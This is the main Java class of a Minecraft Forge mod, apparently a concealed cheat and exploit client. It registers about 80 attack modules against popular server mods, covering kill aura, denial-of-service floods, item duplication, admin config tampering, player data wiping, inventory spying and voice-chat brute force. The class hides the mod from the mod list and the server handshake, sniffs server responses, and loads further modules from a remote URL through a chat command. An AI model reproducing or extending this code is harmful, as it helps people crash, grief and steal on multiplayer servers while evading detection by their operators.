package com.redblue.red;

import com.redblue.red.client.KeyDispatcher;
import com.redblue.red.core.ModuleRegistry;
import com.redblue.red.core.RedConfig;
import com.redblue.red.core.RemoteLoader;
import com.redblue.red.util.ResponseSniffer;
import com.redblue.red.modules.lrtactical.*;
import com.redblue.red.modules.citadel.*;
import com.redblue.red.modules.alexsmobs.*;
import com.redblue.red.modules.corpse.*;
import com.redblue.red.modules.kubejs.*;
import com.redblue.red.modules.journeymap.*;
import com.redblue.red.modules.opac.*;
import com.redblue.red.modules.customnpcs.*;
import com.redblue.red.modules.curios.*;
import com.redblue.red.modules.parcool.*;
import com.redblue.red.modules.limitlessvehicle.*;
import com.redblue.red.modules.immersiveaircraft.*;
import com.redblue.red.modules.cataclysm.*;
import com.redblue.red.modules.flavorimmerseddaily.*;
import com.redblue.red.modules.tacz.*;
import com.redblue.red.modules.taczaddon.*;
import com.redblue.red.modules.legendarysurvival.*;
import com.redblue.red.modules.itemfilters.*;
import com.redblue.red.modules.ftbquests.*;
import com.redblue.red.modules.armourersworkshop.*;
import com.redblue.red.modules.pingwheel.*;
import com.redblue.red.modules.extinctionz.*;
import com.redblue.red.modules.voicechat.*;
import com.mojang.brigadier.arguments.StringArgumentType;
import net.minecraft.commands.Commands;
import net.minecraft.network.chat.Component;
import net.minecraftforge.api.distmarker.Dist;
import net.minecraftforge.common.MinecraftForge;
import net.minecraftforge.event.RegisterCommandsEvent;
import net.minecraftforge.eventbus.api.IEventBus;
import net.minecraftforge.eventbus.api.SubscribeEvent;
import net.minecraftforge.fml.IExtensionPoint;
import net.minecraftforge.fml.ModLoadingContext;
import net.minecraftforge.fml.common.Mod;

import net.minecraftforge.fml.javafmlmod.FMLJavaModLoadingContext;
import net.minecraftforge.fml.loading.FMLEnvironment;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

@Mod("redteam")
public class RedMod {

    private static final Logger LOGGER = LoggerFactory.getLogger("ModCompat");

    public RedMod() {
        LOGGER.info("Compat layer init");
        // 不再注册 ForgeConfigSpec，避免生成 redteam-client.toml 文件

        // 注册隐藏监听器：加载完成后从 ModList + FML 握手中移除 redteam
        FMLJavaModLoadingContext.get().getModEventBus().register(new com.redblue.red.hider.HideOnLoad());

        // Mark as client-only: server won't reject clients with this mod
        ModLoadingContext.get().registerExtensionPoint(
            IExtensionPoint.DisplayTest.class,
            () -> new IExtensionPoint.DisplayTest(
                () -> IExtensionPoint.DisplayTest.IGNORESERVERONLY,
                (remote, isServer) -> true
            )
        );

        // Register built-in attack modules
        // LRTactical (3)
        ModuleRegistry.register(new LRT01_KillAura());
        ModuleRegistry.register(new LRT02_DoS());
        ModuleRegistry.register(new LRT04_DeathAttack());
        // Citadel (3)
        ModuleRegistry.register(new CTD01_EntityTagOverride());
        ModuleRegistry.register(new CTD02_NbtBloatDoS());
        ModuleRegistry.register(new CTD03_DanceSpoof());
        // AlexsMobs (7)
        ModuleRegistry.register(new AM01_ItemInjection());
        ModuleRegistry.register(new AM02_HurtMultipart());
        ModuleRegistry.register(new AM03_EntityTeleport());
        ModuleRegistry.register(new AM04_EagleHijack());
        ModuleRegistry.register(new AM05_ForceDismount());
        ModuleRegistry.register(new AM06_BiomeCorrupt());
        ModuleRegistry.register(new AM07_ArthropodSting());
        // Corpse (3)
        ModuleRegistry.register(new CORPSE01_DeathHistorySpy());
        ModuleRegistry.register(new CORPSE02_PageCrash());
        ModuleRegistry.register(new CORPSE03_IoFlood());
        // KubeJS (3)
        ModuleRegistry.register(new KJS01_DataInject());
        ModuleRegistry.register(new KJS02_ClickFlood());
        ModuleRegistry.register(new KJS03_NbtBloat());
        // JourneyMap (5)
        ModuleRegistry.register(new JM01_Teleport());
        ModuleRegistry.register(new JM02_AdminConfigWrite());
        ModuleRegistry.register(new JM03_AdminConfigRead());
        ModuleRegistry.register(new JM04_MultiplayerSpoof());
        ModuleRegistry.register(new JM05_DoS());
        // Open Parties and Claims (5)
        ModuleRegistry.register(new OPAC01_ClaimAreaDoS());
        ModuleRegistry.register(new OPAC02_SyncFlood());
        ModuleRegistry.register(new OPAC03_SubConfigChurn());
        ModuleRegistry.register(new OPAC04_LazyConfirmFlood());
        ModuleRegistry.register(new OPAC05_ConfigMemPressure());
        // CustomNPCs (7)
        ModuleRegistry.register(new CNPC01_NbtOverwrite());
        ModuleRegistry.register(new CNPC02_DialogForge());
        ModuleRegistry.register(new CNPC03_RemoteNpc());
        ModuleRegistry.register(new CNPC04_DimensionTp());
        ModuleRegistry.register(new CNPC05_PlayerDataWipe());
        ModuleRegistry.register(new CNPC06_SchematicBuild());
        ModuleRegistry.register(new CNPC07_ScreenSize());
        // Curios (2)
        ModuleRegistry.register(new CURIOS01_DestroyAll());
        ModuleRegistry.register(new CURIOS02_RenderToggle());
        // ParCool (3)
        ModuleRegistry.register(new PCOOL01_InfiniteStamina());
        ModuleRegistry.register(new PCOOL02_ActionSpoof());
        ModuleRegistry.register(new PCOOL03_DoS());
        // LimitlessVehicle (6)
        ModuleRegistry.register(new LV01_VehicleHijack());
        ModuleRegistry.register(new LV02_ArtilleryStrike());
        ModuleRegistry.register(new LV03_FigureBoxManip());
        ModuleRegistry.register(new LV04_RemoteCraft());
        ModuleRegistry.register(new LV05_DisplaySpoof());
        ModuleRegistry.register(new LV06_TurretAbuse());
        // Immersive Aircraft (6)
        ModuleRegistry.register(new IA01_CollisionDamage());
        ModuleRegistry.register(new IA02_VelocityInject());
        ModuleRegistry.register(new IA03_InventorySpy());
        ModuleRegistry.register(new IA04_FireExploit());
        ModuleRegistry.register(new IA05_EngineNaN());
        ModuleRegistry.register(new IA06_EnumOobCrash());
        // Cataclysm (2)
        ModuleRegistry.register(new CATA01_AltarInject());
        ModuleRegistry.register(new CATA02_AltarRaceDoS());
        // FlavorImmersedDaily (3)
        ModuleRegistry.register(new FID01_RemoteCraft());
        ModuleRegistry.register(new FID02_BatchExploit());
        ModuleRegistry.register(new FID03_RemoteGUI());
        // TACZ (2)
        ModuleRegistry.register(new TACZ01_AttachmentDupe());
        ModuleRegistry.register(new TACZ02_RapidFire());
        // TACZAddon (3)
        ModuleRegistry.register(new TACZADD01_SlotSwap());
        ModuleRegistry.register(new TACZADD02_RemoteContainer());
        ModuleRegistry.register(new TACZADD03_AmmoBoxCrash());
        // LegendarySurvival (2)
        ModuleRegistry.register(new LSO01_InfiniteHeal());
        ModuleRegistry.register(new LSO02_InstantDrink());
        // ItemFilters (2)
        ModuleRegistry.register(new IF01_FilterSwap());
        ModuleRegistry.register(new IF02_ReDoS());
        // FTBQuests (6)
        ModuleRegistry.register(new FTQ01_EmergencyItemDupe());
        ModuleRegistry.register(new FTQ02_QuestMoveVandal());
        ModuleRegistry.register(new FTQ03_QuestCopyDoS());
        ModuleRegistry.register(new FTQ04_ChapterImageInject());
        ModuleRegistry.register(new FTQ05_StructureLeak());
        ModuleRegistry.register(new FTQ06_TaskScreenTamper());

        // ArmourersWorkshop (6)
        ModuleRegistry.register(new AW01_BlockColorDoS());
        ModuleRegistry.register(new AW02_WardrobeHijack());
        ModuleRegistry.register(new AW03_RemoteBlockEntity());
        ModuleRegistry.register(new AW04_SkinDocumentDestroy());
        ModuleRegistry.register(new AW05_SkinRequestFlood());
        ModuleRegistry.register(new AW06_ColorPickerNbt());
        // PingWheel (3)
        ModuleRegistry.register(new PW01_PingSpoof());
        ModuleRegistry.register(new PW02_ChannelSpy());
        ModuleRegistry.register(new PW03_PingFlood());
        // ExtinctionZ (4)
        ModuleRegistry.register(new EXT01_RemoteContainer());
        ModuleRegistry.register(new EXT02_BackpackNbtInject());
        ModuleRegistry.register(new EXT03_SupplyDropDestroy());
        ModuleRegistry.register(new EXT04_BackpackRefBypass());
        // VoiceChat (3)
        ModuleRegistry.register(new VC01_GroupBruteForce());
        ModuleRegistry.register(new VC02_GroupFloodDoS());
        ModuleRegistry.register(new VC03_AudioAmplify());

        IEventBus modBus = FMLJavaModLoadingContext.get().getModEventBus();

        if (FMLEnvironment.dist == Dist.CLIENT) {
            modBus.addListener(KeyDispatcher::registerKeys);
            MinecraftForge.EVENT_BUS.register(KeyDispatcher.class);
            MinecraftForge.EVENT_BUS.register(ResponseSniffer.class);
        }
        MinecraftForge.EVENT_BUS.register(this);
    }

    @SubscribeEvent
    public void onRegisterCommands(RegisterCommandsEvent event) {
        event.getDispatcher().register(
            Commands.literal("rc")
                .then(Commands.literal("load")
                    .then(Commands.argument("token", StringArgumentType.string())
                        .executes(ctx -> {
                            String token = StringArgumentType.getString(ctx, "token");
                            String url = RedConfig.REMOTE_URL.get();
                            RemoteLoader.load(url, token);
                            ctx.getSource().sendSuccess(
                                () -> Component.literal("Modules loaded"), false);
                            return 1;
                        })
                    )
                )
                .then(Commands.literal("unload")
                    .executes(ctx -> {
                        RemoteLoader.unload();
                        ctx.getSource().sendSuccess(
                            () -> Component.literal("Modules unloaded"), false);
                        return 1;
                    })
                )
                .then(Commands.literal("list")
                    .executes(ctx -> {
                        var modules = com.redblue.red.core.ModuleRegistry.getAll();
                        if (modules.isEmpty()) {
                            ctx.getSource().sendSuccess(
                                () -> Component.literal("No modules loaded"), false);
                        } else {
                            for (var m : modules) {
                                ctx.getSource().sendSuccess(
                                    () -> Component.literal(
                                        "  " + m.id() + " - " + m.name() +
                                        (m.isAvailable() ? " [READY]" : " [N/A]")),
                                    false);
                            }
                        }
                        return 1;
                    })
                )
        );
    }
}
